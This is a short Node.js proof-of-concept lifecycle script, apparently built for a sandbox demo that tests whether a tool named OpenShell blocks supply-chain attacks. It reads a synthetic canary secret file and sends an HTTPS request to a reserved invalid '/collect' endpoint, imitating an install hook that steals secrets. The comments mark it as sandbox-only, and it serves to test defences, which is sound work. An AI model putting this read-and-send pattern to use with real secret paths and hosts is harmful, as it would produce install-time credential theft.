const fs = require('fs');
const https = require('https');

// DO NOT RUN ON HOST. PoC-only lifecycle script for the controlled sandbox flow.
// It only targets a synthetic canary and a reserved invalid egress endpoint.
const canaryPath = process.env.CHAINSHIELD_CANARY_PATH || '/sandbox/canary/canary-secret.txt';
try {
  fs.readFileSync(canaryPath, 'utf8');
} catch (error) {
  // The sandbox demo expects OpenShell to deny this read before host data is reachable.
}

const request = https.request('https://chainshield-egress-test.invalid/collect');
request.on('error', () => {});
request.end('synthetic-demo-only');
